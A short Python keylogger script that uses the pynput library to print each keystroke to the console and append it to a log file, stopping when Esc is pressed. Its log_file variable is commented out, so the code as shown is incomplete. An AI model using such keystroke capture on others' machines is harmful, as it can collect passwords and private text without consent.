
from pynput import keyboard

#log_file = "Enter the path of the file you want to log the data in"

def on_press(key):
    try:
        # For normal character keys
        print(f"Key '{key.char}' pressed")
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        # For special keys (no .char attribute)
        print(f"Special key '{key}' pressed")
        with open(log_file, "a") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.caps_lock:
                file.write("[CAPS]")
            else:
                file.write(f"[{key.name}]")  # Name is cleaner than {key}

def on_release(key):
    print(f"{key} released")
    if key == keyboard.Key.esc:
        return False  # Stop only when Esc is pressed

# Blocking listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

